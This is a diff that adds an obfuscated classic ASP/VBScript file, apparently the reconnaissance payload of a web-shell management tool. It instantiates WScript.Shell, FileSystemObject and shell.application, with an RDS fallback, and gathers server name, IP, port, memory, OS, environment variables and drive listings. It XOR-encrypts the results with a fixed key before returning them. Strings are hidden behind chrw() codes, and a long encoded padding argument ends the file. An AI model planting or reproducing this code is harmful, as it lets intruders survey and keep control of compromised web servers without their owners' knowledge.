@@ -1,0 +1,215 @@
+dim basicInfo,driveList,currentPath,osInfo
+currentPath=Server.MapPath(".")
+osInfo=request.servervariables("os")
+
+Function Encrypt(data)
+k="e45e329feb5d925b"
+size=len(data)
+For i=1 To size
+result=result&Chrb(asc(mid(data,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
+Next
+Encrypt=result
+End Function
+
+Function Base64Encode(sText)
+    Dim oXML, oNode
+
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue =Stream_StringToBinary(sText)
+    If Mid(oNode.text,1,4)="77u/" Then
+    oNode.text=Mid(oNode.text,5)
+    End If
+    Base64Encode = Replace(oNode.text, vbLf, "")
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+Function Base64Decode(ByVal vCode)
+    Dim oXML, oNode
+
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.text = vCode
+    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
+'Stream_StringToBinary Function
+'2003 Antonin Foller, http://www.motobit.com
+'Text - string parameter To convert To binary data
+Function Stream_StringToBinary(Text)
+  Const adTypeText = 2
+  Const adTypeBinary = 1
+
+  'Create Stream object
+  Dim BinaryStream 'As New Stream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+
+  'Specify stream type - we want To save text/string data.
+  BinaryStream.Type = adTypeText
+
+  'Specify charset For the source text (unicode) data.
+  BinaryStream.CharSet = "utf-8"
+
+  'Open the stream And write text/string data To the object
+  BinaryStream.Open
+  BinaryStream.WriteText Text
+
+  'Change stream type To binary
+  BinaryStream.Position = 0
+  BinaryStream.Type = adTypeBinary
+
+  'Ignore first two bytes - sign of
+  BinaryStream.Position = 0
+
+  'Open the stream And get binary data from the object
+  Stream_StringToBinary = BinaryStream.Read
+
+  Set BinaryStream = Nothing
+End Function
+
+'Stream_BinaryToString Function
+'2003 Antonin Foller, http://www.motobit.com
+'Binary - VT_UI1 | VT_ARRAY data To convert To a string 
+Function Stream_BinaryToString(Binary)
+  Const adTypeText = 2
+  Const adTypeBinary = 1
+
+  'Create Stream object
+  Dim BinaryStream 'As New Stream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+
+  'Specify stream type - we want To save binary data.
+  BinaryStream.Type = adTypeBinary
+
+  'Open the stream And write binary data To the object
+  BinaryStream.Open
+  BinaryStream.Write Binary
+
+  'Change stream type To text/string
+  BinaryStream.Position = 0
+  BinaryStream.Type = adTypeText
+
+  'Specify charset For the output text (unicode) data.
+  BinaryStream.CharSet = "utf-8"
+
+  'Open the stream And get text/string data from the object
+  Stream_BinaryToString = BinaryStream.ReadText
+  Set BinaryStream = Nothing
+End Function
+function DriveType(TP)
+	select case TP
+	Case 0:DriveType=chrw(26410)&chrw(30693)&chrw(30913)&chrw(30424)
+	Case 1:DriveType=chrw(31227)&chrw(21160)&chrw(30913)&chrw(30424)
+	Case 2:DriveType=chrw(26412)&chrw(22320)&chrw(30913)&chrw(30424)
+	Case 3:DriveType=chrw(32593)&chrw(32476)&chrw(20849)&chrw(20139)
+	Case 4:DriveType=chrw(20809)&chrw(-25999)
+	Case 5:DriveType=chrw(82)&chrw(65)&chrw(77)&chrw(30913)&chrw(30424)
+	end select
+end function
+Function GetFso()
+	Dim Fso,Key
+	Key="Scripting.FileSystemObject"
+	Set Fso=CreateObject(Key)
+	if IsEmpty(Fso) then Set Fso=Hfso
+	if Not IsEmpty(Fso) then Set GetFso=Fso
+	Set Fso=RDS(Key)
+	Set GetFso=Fso
+End Function
+function GetSize(thesize)
+	if thesize>=(1024^3) then GetSize=fix((thesize/(1024^3))*100)/100&"g"
+	if thesize>=(1024^2) and thesize<(1024^3) then GetSize=fix((thesize /(1024^2))*100)/100&"m"
+	if thesize>=1024 and thesize<(1024^2) then GetSize=fix((thesize/1024)*100)/100&"k"
+	if thesize>=0 and thesize<1024 then GetSize=thesize&"b"
+end function
+sub echo(str)
+	'response.Write(str)
+	basicInfo=basicInfo&str
+end sub
+Function RDS(COM)
+	Set r=CreateObject("RDS.DataSpace")
+	Set RDS=r.CreateObject(COM,"")
+End Function
+Function GetWS()
+	Dim WS,Key
+	Key="WScript.Shell"
+	Set WS=CreateObject(Key)
+	if Not IsEmpty(WS) then Set GetWS=WS
+	if IsEmpty(WS) then	Set WS=Hws
+	Set WS=RDS(Key)
+	Set GetWS=WS
+End Function
+Function GetSA()
+	Dim SA,Key
+	Key="shell.application"
+	Set SA=CreateObject(Key)
+	if IsEmpty(SA) then	Set SA=HSA
+	if Not IsEmpty(SA) then Set GetSA=SA
+	Set SA=RDS(Key)
+	Set GetSA=SA
+End Function
+Sub main(arrArgs)
+		on error resume next
+		dim i,ws,Sa,sysenv,envlist,envlists,cpunum,cpuinfo,os
+		envlists="SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
+		envlist=split(envlists,"$")
+		Set ws=GetWS()
+		set sysenv=ws.environment("system")
+		with request
+		cpunum=.servervariables("number_of_processors")
+		if isnull(cpunum) or cpunum="" then cpunum=sysenv("number_of_processors")
+		os=.servervariables("os")
+		if isnull(os) or os="" then	os=sysenv("os")&"("&chrw(26377)&chrw(21487)&chrw(-32515)&chrw(26159)&chrw(32)&chrw(119)&chrw(105)&chrw(110)&chrw(100)&chrw(111)&chrw(119)&chrw(115)&chrw(50)&chrw(48)&chrw(48)&chrw(51)&chrw(32)&chrw(21734)&")"
+		cpuinfo=sysenv("processor_identifier")
+		osInfo=os
+		echo "<font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30456)&chrw(20851)&chrw(21442)&chrw(25968)&":</font><hr>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(21517)&":"&.servervariables("server_name")&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&"ip:"&.servervariables("local_addr")&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(31471)&chrw(21475)&":"&.servervariables("server_port")&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(20869)&chrw(23384)&":"&GetSize(GetSA().getsysteminformation("physicalmemoryinstalled"))&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(26102)&chrw(-27148)&":"&now&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-28817)&chrw(20214)&":"&.servervariables("server_software")&"</li>"
+		echo "<li>"&chrw(-32486)&chrw(26412)&chrw(-29307)&chrw(26102)&chrw(26102)&chrw(-27148)&":"&server.scripttimeout&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(25968)&chrw(-28209)&":"&cpunum&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(99)&chrw(112)&chrw(117)&chrw(-29722)&chrw(24773)&":"&cpuinfo&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(25805)&chrw(20316)&chrw(31995)&chrw(32479)&":"&os&"</li>"
+		echo "<li>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(-30237)&chrw(-29743)&chrw(24341)&chrw(25806)&":"&scriptengine&"/"&scriptenginemajorversion&"."&scriptengineminorversion&"."&scriptenginebuildversion&"</li>"
+		echo "<li>"&chrw(26412)&chrw(25991)&chrw(20214)&chrw(23454)&chrw(-27067)&chrw(-29201)&chrw(24452)&":"&.servervariables("path_translated")&"</li>"
+		end with
+		for i=0 to ubound(envlist)
+			echo "<li>"&envlist(i)&": "&ws.expandenvironmentstrings("%"&envlist(i)&"%")&"</li>"
+		next
+		set ws=nothing
+		set sysenv=nothing
+		Dim TheDrive,Fso
+		set Fso=GetFso()
+		echo "<hr><font color=red>"&chrw(26381)&chrw(21153)&chrw(22120)&chrw(30913)&chrw(30424)&chrw(20449)&chrw(24687)&"</font>:"
+		echo "<table><tr bgcolor=green><td>"&chrw(30424)&chrw(31526)&"</td><td>"&chrw(31867)&chrw(22411)&"</td><td>"&chrw(21367)&chrw(26631)&"</td><td>"&chrw(25991)&chrw(20214)&chrw(31995)&chrw(32479)&"</td><td>"&chrw(21487)&chrw(29992)&chrw(31354)&chrw(-27148)&"</td><td>"&chrw(24635)&chrw(31354)&chrw(-27148)&"</td></tr>"
+		For Each TheDrive In Fso.Drives
+			with TheDrive
+			driveList=driveList&.DriveLetter&":/;"
+			echo "<tr><td bgcolor=green>"&.DriveLetter&"</td>"
+			echo "<td>"&DriveType(.DriveType)&"</td>"
+			If Not UCase(.DriveLetter)="A" Then
+				echo "<td>"&.VolumeName&"</td>"
+				echo "<td>"&.FileSystem&"</td>"
+				echo "<td>"&GetSize(.FreeSpace)&"</td>"
+				echo "<td>"&GetSize(.TotalSize)&"</td>"
+			End If
+			end with
+			If Err Then Err.Clear
+		Next
+		echo "</table><hr><br/>"
+		Set TheDrive=Nothing
+		Set Fso=Nothing
+		finalResult="{""basicInfo"":"""&Base64Encode(basicInfo)&""",""driveList"":"""&Base64Encode(driveList)&""",""arch"":""IA=="",""currentPath"":"""&Base64Encode(currentPath)&""",""osInfo"":"""&Base64Encode(osInfo)&"""}"
+		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(finalResult)&"""}"
+		Response.binarywrite(Encrypt(finalResult))
+		'Response.write(finalResult)
+End Sub
+
+main Array(chrw(67)&chrw(84)&chrw(105)&chrw(85)&chrw(110)&chrw(119)&chrw(121)&chrw(119)&chrw(120)&chrw(72)&chrw(70)&chrw(81)&chrw(102)&chrw(65)&chrw(114)&chrw(107)&chrw(114)&chrw(88)&chrw(86)&chrw(87)&chrw(68)&chrw(98)&chrw(121)&chrw(72)&chrw(70)&chrw(101)&chrw(90)&chrw(89)&chrw(57)&chrw(49)&chrw(89)&chrw(74)&chrw(107)&chrw(120)&chrw(56)&chrw(107)&chrw(90)&chrw(97)&chrw(70)&chrw(105)&chrw(105)&chrw(57)&chrw(98)&chrw(122)&chrw(49)&chrw(98)&chrw(80)&chrw(117)&chrw(97)&chrw(99)&chrw(115)&chrw(120)&chrw(90)&chrw(121)&chrw(50)&chrw(97)&chrw(110)&chrw(114)&chrw(65)&chrw(48)&chrw(67)&chrw(81)&chrw(50)&chrw(74)&chrw(105)&chrw(57)&chrw(109)&chrw(104)&chrw(110)&chrw(73)&chrw(119)&chrw(107)&chrw(90)&chrw(57)&chrw(69)&chrw(75)&chrw(86)&chrw(120)&chrw(122)&chrw(116)&chrw(101)&chrw(72)&chrw(122)&chrw(83)&chrw(74)&chrw(101)&chrw(80)&chrw(110)&chrw(77)&chrw(108)&chrw(84)&chrw(120)&chrw(76)&chrw(78)&chrw(117)&chrw(48)&chrw(114)&chrw(56)&chrw(66)&chrw(80)&chrw(70)&chrw(81)&chrw(122)&chrw(122)&chrw(85)&chrw(90)&chrw(109)&chrw(89)&chrw(82)&chrw(81)&chrw(114)&chrw(121)&chrw(49)&chrw(81)&chrw(54)&chrw(66)&chrw(80)&chrw(103)&chrw(53)&chrw(82)&chrw(88)&chrw(117)&chrw(110)&chrw(108)&chrw(48)&chrw(117)&chrw(76)&chrw(90)&chrw(71)&chrw(48)&chrw(110)&chrw(49)&chrw(90)&chrw(100)&chrw(77)&chrw(110)&chrw(81)&chrw(113)&chrw(66)&chrw(68)&chrw(119)&chrw(100)&chrw(121)&chrw(87)&chrw(67)&chrw(71)&chrw(53)&chrw(90)&chrw(48)&chrw(48)&chrw(70)&chrw(53)&chrw(114)&chrw(69)&chrw(72)&chrw(65)&chrw(111)&chrw(119)&chrw(86)&chrw(121)&chrw(54)&chrw(52)&chrw(77)&chrw(116)&chrw(72)&chrw(119)&chrw(113)&chrw(86)&chrw(102)&chrw(111)&chrw(74)&chrw(110)&chrw(97)&chrw(54)&chrw(76)&chrw(104)&chrw(51)&chrw(55)&chrw(82)&chrw(49)&chrw(110)&chrw(106)&chrw(50)&chrw(119)&chrw(118)&chrw(65)&chrw(102)&chrw(84)&chrw(80)&chrw(89)&chrw(55)&chrw(118)&chrw(71)&chrw(87)&chrw(105)&chrw(83)&chrw(77)&chrw(111)&chrw(75)&chrw(52)&chrw(71)&chrw(65)&chrw(106)&chrw(108)&chrw(67)&chrw(48)&chrw(85)&chrw(54)&chrw(87)&chrw(114)&chrw(70)&chrw(75)&chrw(105)&chrw(77)&chrw(54)&chrw(111)&chrw(69)&chrw(79)&chrw(78)&chrw(89)&chrw(83)&chrw(52)&chrw(105)&chrw(114)&chrw(66)&chrw(65)&chrw(86)&chrw(111)&chrw(114)&chrw(75)&chrw(86)&chrw(107)&chrw(108)&chrw(89)&chrw(109)&chrw(90)&chrw(70)&chrw(106)&chrw(75)&chrw(111)&chrw(101)&chrw(120)&chrw(51)&chrw(87)&chrw(51)&chrw(69)&chrw(50)&chrw(82)&chrw(122)&chrw(117)&chrw(65)&chrw(68)&chrw(80)&chrw(69)&chrw(117)&chrw(83)&chrw(51)&chrw(108)&chrw(68)&chrw(108)&chrw(119)&chrw(67)&chrw(80)&chrw(101)&chrw(74)&chrw(89)&chrw(119)&chrw(68)&chrw(120)&chrw(98)&chrw(112)&chrw(89)&chrw(118)&chrw(109)&chrw(80)&chrw(74)&chrw(107)&chrw(117)&chrw(67)&chrw(97)&chrw(115)&chrw(65)&chrw(77)&chrw(55)&chrw(77)&chrw(111)&chrw(116)&chrw(107)&chrw(68)&chrw(122)&chrw(102)&chrw(76)&chrw(122)&chrw(70)&chrw(89)&chrw(102)&chrw(80)&chrw(78)&chrw(118)&chrw(121)&chrw(82)&chrw(80)&chrw(119)&chrw(89)&chrw(122)&chrw(97)&chrw(57)&chrw(88)&chrw(68)&chrw(84)&chrw(111)&chrw(70)&chrw(52)&chrw(85)&chrw(54)&chrw(79)&chrw(118)&chrw(114)&chrw(81)&chrw(86)&chrw(116)&chrw(49)&chrw(104)&chrw(81)&chrw(118)&chrw(101)&chrw(114)&chrw(69)&chrw(50)&chrw(100)&chrw(71)&chrw(79)&chrw(121)&chrw(80)&chrw(88)&chrw(51)&chrw(86)&chrw(85)&chrw(71)&chrw(118)&chrw(117)&chrw(68)&chrw(78)&chrw(113)&chrw(80)&chrw(116)&chrw(52)&chrw(69)&chrw(67)&chrw(103)&chrw(115)&chrw(74)&chrw(65)&chrw(85)&chrw(120)&chrw(68)&chrw(78)&chrw(73)&chrw(78)&chrw(49)&chrw(66)&chrw(77)&chrw(65)&chrw(66)&chrw(105)&chrw(65)&chrw(72)&chrw(85)&chrw(115)&chrw(121)&chrw(104)&chrw(85)&chrw(76)&chrw(86)&chrw(85)&chrw(104)&chrw(73)&chrw(86)&chrw(117)&chrw(112)&chrw(116)&chrw(98)&chrw(100)&chrw(52)&chrw(97)&chrw(84)&chrw(75)&chrw(65)&chrw(120)&chrw(87)&chrw(52)&chrw(84)&chrw(49)&chrw(101)&chrw(122)&chrw(113)&chrw(53)&chrw(56)&chrw(112)&chrw(106)&chrw(110)&chrw(104)&chrw(65)&chrw(110)&chrw(122)&chrw(110)&chrw(86)&chrw(120)&chrw(110)&chrw(81)&chrw(90)&chrw(77)&chrw(105)&chrw(103)&chrw(65)&chrw(54)&chrw(50)&chrw(66)&chrw(115)&chrw(105)&chrw(80)&chrw(121)&chrw(85)&chrw(90)&chrw(51)&chrw(114)&chrw(76)&chrw(76)&chrw(50)&chrw(83)&chrw(74)&chrw(118)&chrw(110)&chrw(88)&chrw(50)&chrw(85)&chrw(98)&chrw(66)&chrw(74)&chrw(108)&chrw(76)&chrw(67)&chrw(120)&chrw(76)&chrw(49)&chrw(109)&chrw(52)&chrw(112)&chrw(103)&chrw(89)&chrw(110)&chrw(90)&chrw(49)&chrw(114)&chrw(122)&chrw(112)&chrw(98)&chrw(70)&chrw(77)&chrw(113)&chrw(111)&chrw(76)&chrw(119)&chrw(108)&chrw(117)&chrw(100)&chrw(53)&chrw(80)&chrw(88)&chrw(86)&chrw(82)&chrw(119)&chrw(55)&chrw(89)&chrw(70)&chrw(111)&chrw(69)&chrw(57)&chrw(118)&chrw(112)&chrw(65)&chrw(114)&chrw(55)&chrw(116)&chrw(119)&chrw(103)&chrw(84)&chrw(115)&chrw(53)&chrw(48)&chrw(76)&chrw(119)&chrw(98)&chrw(114)&chrw(89)&chrw(112)&chrw(68)&chrw(77)&chrw(116)&chrw(67)&chrw(81)&chrw(71)&chrw(116)&chrw(48)&chrw(69)&chrw(85)&chrw(115)&chrw(75)&chrw(82)&chrw(89)&chrw(108)&chrw(85)&chrw(49)&chrw(69)&chrw(81)&chrw(112)&chrw(56)&chrw(52)&chrw(77)&chrw(77)&chrw(79)&chrw(120)&chrw(118)&chrw(102)&chrw(112)&chrw(72)&chrw(120)&chrw(48)&chrw(101)&chrw(81)&chrw(90)&chrw(71)&chrw(52)&chrw(106)&chrw(56)&chrw(81)&chrw(109)&chrw(66)&chrw(73)&chrw(74)&chrw(113)&chrw(115)&chrw(84)&chrw(50)&chrw(78)&chrw(49)&chrw(69)&chrw(120)&chrw(103)&chrw(79)&chrw(86)&chrw(121)&chrw(97)&chrw(65)&chrw(71)&chrw(90)&chrw(97)&chrw(87)&chrw(101)&chrw(116)&chrw(115)&chrw(55)&chrw(106)&chrw(84)&chrw(111)&chrw(106)&chrw(105)&chrw(84)&chrw(114)&chrw(121)&chrw(114)&chrw(76)&chrw(49)&chrw(68)&chrw(107)&chrw(120)&chrw(79)&chrw(54)&chrw(102)&chrw(84)&chrw(115)&chrw(50)&chrw(111)&chrw(112)&chrw(116)&chrw(104)&chrw(85)&chrw(117)&chrw(72)&chrw(55)&chrw(77)&chrw(85)&chrw(103)&chrw(103)&chrw(83)&chrw(49)&chrw(73)&chrw(49)&chrw(120)&chrw(51)&chrw(52)&chrw(65)&chrw(76)&chrw(104)&chrw(114)&chrw(56)&chrw(75)&chrw(76)&chrw(72)&chrw(67)&chrw(101)&chrw(90)&chrw(76)&chrw(72)&chrw(73)&chrw(107)&chrw(119)&chrw(77)&chrw(109)&chrw(100)&chrw(74)&chrw(112)&chrw(117)&chrw(111)&chrw(112)&chrw(85)&chrw(119)&chrw(122)&chrw(90)&chrw(101)&chrw(72)&chrw(84)&chrw(83)&chrw(117)&chrw(104)&chrw(106)&chrw(111)&chrw(56)&chrw(54)&chrw(111)&chrw(120)&chrw(57)&chrw(81)&chrw(109)&chrw(76)&chrw(69)&chrw(54)&chrw(101)&chrw(112)&chrw(66)&chrw(56)&chrw(73)&chrw(48)&chrw(67)&chrw(113)&chrw(69)&chrw(102)&chrw(88)&chrw(66)&chrw(82)&chrw(110)&chrw(108)&chrw(67)&chrw(97)&chrw(109)&chrw(87)&chrw(115)&chrw(76)&chrw(84)&chrw(67)&chrw(81)&chrw(50)&chrw(52)&chrw(74)&chrw(101)&chrw(105)&chrw(87)&chrw(85)&chrw(83)&chrw(114)&chrw(88)&chrw(112)&chrw(81)&chrw(114)&chrw(110)&chrw(98)&chrw(85)&chrw(99)&chrw(51)&chrw(81)&chrw(52)&chrw(116)&chrw(99)&chrw(73)&chrw(48)&chrw(73)&chrw(108)&chrw(116)&chrw(71)&chrw(75)&chrw(89)&chrw(90)&chrw(89)&chrw(99)&chrw(111)&chrw(56)&chrw(74)&chrw(86)&chrw(52)&chrw(87)&chrw(76)&chrw(86)&chrw(49)&chrw(56)&chrw(100)&chrw(106)&chrw(69)&chrw(79)&chrw(76)&chrw(84)&chrw(71)&chrw(66)&chrw(101)&chrw(72)&chrw(83)&chrw(119)&chrw(67)&chrw(85)&chrw(102)&chrw(82)&chrw(120)&chrw(65)&chrw(54)&chrw(101)&chrw(107)&chrw(118)&chrw(111)&chrw(71)&chrw(69)&chrw(75)&chrw(90)&chrw(57)&chrw(105)&chrw(66)&chrw(107)&chrw(117)&chrw(50)&chrw(81)&chrw(102)&chrw(90)&chrw(97)&chrw(50)&chrw(66)&chrw(49)&chrw(90)&chrw(75)&chrw(110)&chrw(121)&chrw(72)&chrw(90)&chrw(115)&chrw(89)&chrw(112)&chrw(55)&chrw(82)&chrw(111)&chrw(113)&chrw(78)&chrw(69)&chrw(99)&chrw(57)&chrw(68)&chrw(90)&chrw(110)&chrw(100)&chrw(53)&chrw(50)&chrw(84)&chrw(80)&chrw(88)&chrw(117)&chrw(83)&chrw(113)&chrw(81)&chrw(86)&chrw(48)&chrw(102)&chrw(118)&chrw(53)&chrw(72)&chrw(73)&chrw(114)&chrw(122)&chrw(117)&chrw(112)&chrw(108)&chrw(110)&chrw(122)&chrw(73)&chrw(84)&chrw(81)&chrw(108)&chrw(88)&chrw(74)&chrw(48)&chrw(102)&chrw(83)&chrw(72)&chrw(88)&chrw(66)&chrw(81)&chrw(113)&chrw(82)&chrw(102)&chrw(82)&chrw(111)&chrw(100)&chrw(118)&chrw(120)&chrw(114)&chrw(48)&chrw(105)&chrw(116)&chrw(122)&chrw(114)&chrw(50)&chrw(79)&chrw(120)&chrw(56)&chrw(105)&chrw(56)&chrw(104)&chrw(86)&chrw(82)&chrw(113)&chrw(99)&chrw(101)&chrw(50)&chrw(85)&chrw(84)&chrw(67)&chrw(110)&chrw(105)&chrw(90)&chrw(83)&chrw(70)&chrw(53)&chrw(52)&chrw(101)&chrw(74)&chrw(82)&chrw(83)&chrw(109)&chrw(114)&chrw(105)&chrw(56)&chrw(112)&chrw(101)&chrw(67)&chrw(72)&chrw(97)&chrw(111)&chrw(54)&chrw(89)&chrw(68)&chrw(114)&chrw(87)&chrw(106)&chrw(118)&chrw(84)&chrw(117)&chrw(87)&chrw(75)&chrw(108)&chrw(101)&chrw(54)&chrw(66)&chrw(75)&chrw(102)&chrw(113)&chrw(102)&chrw(105)&chrw(77)&chrw(107)&chrw(122)&chrw(74)&chrw(81)&chrw(86)&chrw(106)&chrw(81)&chrw(69)&chrw(116)&chrw(55)&chrw(90)&chrw(97)&chrw(82)&chrw(68)&chrw(120)&chrw(52)&chrw(98)&chrw(110)&chrw(86)&chrw(97)&chrw(86)&chrw(79)&chrw(116)&chrw(54)&chrw(106)&chrw(97)&chrw(80)&chrw(115)&chrw(116)&chrw(116)&chrw(105)&chrw(73)&chrw(116)&chrw(120)&chrw(98)&chrw(76)&chrw(76)&chrw(117)&chrw(56)&chrw(87)&chrw(115)&chrw(112)&chrw(121)&chrw(122)&chrw(84)&chrw(112)&chrw(71)&chrw(83)&chrw(86)&chrw(117)&chrw(119)&chrw(99)&chrw(104)&chrw(80)&chrw(55)&chrw(81)&chrw(104)&chrw(84)&chrw(114)&chrw(109)&chrw(121)&chrw(86)&chrw(113)&chrw(112)&chrw(85)&chrw(116)&chrw(71)&chrw(90)&chrw(54)&chrw(70)&chrw(101)&chrw(103)&chrw(73)&chrw(56)&chrw(66)&chrw(74)&chrw(78)&chrw(115)&chrw(77)&chrw(49)&chrw(112)&chrw(51)&chrw(114)&chrw(116)&chrw(101)&chrw(102)&chrw(53)&chrw(116)&chrw(111)&chrw(99)&chrw(112)&chrw(55)&chrw(113)&chrw(69)&chrw(56)&chrw(71)&chrw(75)&chrw(84)&chrw(112)&chrw(103)&chrw(52)&chrw(86)&chrw(72)&chrw(116)&chrw(89)&chrw(105)&chrw(115)&chrw(80)&chrw(72)&chrw(101)&chrw(75)&chrw(51)&chrw(112)&chrw(119)&chrw(116)&chrw(81)&chrw(57)&chrw(105)&chrw(54)&chrw(70)&chrw(104)&chrw(55)&chrw(67)&chrw(56)&chrw(100)&chrw(55)&chrw(121)&chrw(121)&chrw(77)&chrw(103)&chrw(87)&chrw(74)&chrw(117)&chrw(113)&chrw(109)&chrw(72)&chrw(50)&chrw(84)&chrw(51)&chrw(83)&chrw(110)&chrw(117)&chrw(110)&chrw(111)&chrw(117)&chrw(56)&chrw(108)&chrw(52)&chrw(68)&chrw(55)&chrw(65)&chrw(101)&chrw(115)&chrw(52)&chrw(113)&chrw(101)&chrw(107)&chrw(49)&chrw(73)&chrw(57)&chrw(79)&chrw(69)&chrw(107)&chrw(52)&chrw(51)&chrw(105)&chrw(72)&chrw(57)&chrw(67)&chrw(51)&chrw(113)&chrw(103)&chrw(97)&chrw(114)&chrw(70)&chrw(117)&chrw(97)&chrw(55)&chrw(65)&chrw(116)&chrw(113)&chrw(114)&chrw(70)&chrw(49)&chrw(108)&chrw(120)&chrw(50)&chrw(88)&chrw(99)&chrw(115)&chrw(117)&chrw(108)&chrw(56)&chrw(99)&chrw(69)&chrw(74)&chrw(103)&chrw(56)&chrw(53)&chrw(106)&chrw(65)&chrw(88)&chrw(107)&chrw(66)&chrw(122)&chrw(103)&chrw(81)&chrw(49)&chrw(78)&chrw(109)&chrw(70)&chrw(76)&chrw(106)&chrw(104)&chrw(82)&chrw(75)&chrw(55)&chrw(111)&chrw(90)&chrw(85)&chrw(108)&chrw(104)&chrw(73)&chrw(104)&chrw(67)&chrw(121)&chrw(78)&chrw(73)&chrw(53)&chrw(84)&chrw(120)&chrw(102)&chrw(71)&chrw(97)&chrw(122)&chrw(52)&chrw(76)&chrw(56)&chrw(106)&chrw(81)&chrw(77)&chrw(68)&chrw(75)&chrw(70)&chrw(66)&chrw(86)&chrw(73)&chrw(82)&chrw(83)&chrw(109)&chrw(81)&chrw(113)&chrw(77)&chrw(77)&chrw(56)&chrw(102)&chrw(69)&chrw(88)&chrw(69)&chrw(99)&chrw(80)&chrw(99)&chrw(51)&chrw(65)&chrw(112)&chrw(65)&chrw(69)&chrw(56)&chrw(118)&chrw(97)&chrw(99)&chrw(85)&chrw(118)&chrw(90)&chrw(54)&chrw(52)&chrw(71)&chrw(85)&chrw(107)&chrw(121)&chrw(52)&chrw(118)&chrw(109)&chrw(102)&chrw(105)&chrw(87)&chrw(122)&chrw(74)&chrw(120)&chrw(71)&chrw(111)&chrw(89)&chrw(51)&chrw(99)&chrw(119)&chrw(116)&chrw(65)&chrw(73)&chrw(79)&chrw(68)&chrw(51)&chrw(116)&chrw(70)&chrw(121)&chrw(67)&chrw(90)&chrw(83)&chrw(119)&chrw(98)&chrw(113)&chrw(65)&chrw(55)&chrw(74)&chrw(111)&chrw(98)&chrw(113)&chrw(117)&chrw(68)&chrw(76)&chrw(77)&chrw(113)&chrw(68)&chrw(109)&chrw(66)&chrw(66)&chrw(68)&chrw(112)&chrw(99)&chrw(49)&chrw(67)&chrw(113)&chrw(115)&chrw(117)&chrw(99)&chrw(89)&chrw(100)&chrw(90)&chrw(98)&chrw(68)&chrw(118)&chrw(106)&chrw(84)&chrw(115)&chrw(81)&chrw(101)&chrw(53)&chrw(65)&chrw(108)&chrw(50)&chrw(105)&chrw(115)&chrw(114)&chrw(83)&chrw(67)&chrw(81)&chrw(114)&chrw(69)&chrw(66)&chrw(83)&chrw(90)&chrw(86)&chrw(97)&chrw(55)&chrw(109)&chrw(55)&chrw(73)&chrw(106)&chrw(116)&chrw(89)&chrw(86)&chrw(97)&chrw(57)&chrw(121)&chrw(113)&chrw(89)&chrw(69)&chrw(82)&chrw(74)&chrw(111)&chrw(54)&chrw(78)&chrw(54)&chrw(106)&chrw(71)&chrw(112)&chrw(84)&chrw(72)&chrw(119)&chrw(49)&chrw(74)&chrw(122)&chrw(104)&chrw(112)&chrw(50)&chrw(84)&chrw(106)&chrw(97)&chrw(78)&chrw(109)&chrw(48)&chrw(119)&chrw(88)&chrw(102)&chrw(107)&chrw(120)&chrw(88)&chrw(105)&chrw(104)&chrw(83)&chrw(50)&chrw(56)&chrw(76)&chrw(79)&chrw(56)&chrw(51)&chrw(49)&chrw(82)&chrw(85)&chrw(69)&chrw(87)&chrw(55)&chrw(121)&chrw(99)&chrw(50)&chrw(113)&chrw(90)&chrw(55)&chrw(112)&chrw(120)&chrw(50)&chrw(117)&chrw(112)&chrw(105)&chrw(116)&chrw(114)&chrw(119)&chrw(70)&chrw(103)&chrw(105)&chrw(49)&chrw(107)&chrw(119)&chrw(106)&chrw(77)&chrw(114)&chrw(52)&chrw(97)&chrw(51)&chrw(48)&chrw(72)&chrw(114)&chrw(104)&chrw(75)&chrw(122)&chrw(108)&chrw(88)&chrw(107)&chrw(90)&chrw(119)&chrw(88)&chrw(86)&chrw(49)&chrw(80)&chrw(54)&chrw(89)&chrw(86)&chrw(49)&chrw(54)&chrw(70)&chrw(48)&chrw(114)&chrw(57)&chrw(108)&chrw(116)&chrw(82)&chrw(51)&chrw(55)&chrw(56)&chrw(55)&chrw(77)&chrw(78)&chrw(117)&chrw(86)&chrw(78)&chrw(50)&chrw(71)&chrw(108)&chrw(111)&chrw(118)&chrw(98)&chrw(86)&chrw(54)&chrw(56)&chrw(90)&chrw(49)&chrw(98)&chrw(117)&chrw(118)&chrw(83)&chrw(104)&chrw(66)&chrw(119)&chrw(57)&chrw(80)&chrw(108)&chrw(116)&chrw(86)&chrw(110)&chrw(65)&chrw(108)&chrw(52)&chrw(50)&chrw(66)&chrw(77)&chrw(68)&chrw(98)&chrw(107)&chrw(50)&chrw(103)&chrw(98)&chrw(70)&chrw(100)&chrw(100)&chrw(77)&chrw(119)&chrw(50)&chrw(75)&chrw(56)&chrw(56)&chrw(52)&chrw(118)&chrw(97)&chrw(57)&chrw(100)&chrw(99)&chrw(76)&chrw(65)&chrw(54)&chrw(107)&chrw(77)&chrw(116)&chrw(101)&chrw(85)&chrw(68)&chrw(70)&chrw(69)&chrw(121)&chrw(118)&chrw(115)&chrw(108)&chrw(56)&chrw(112)&c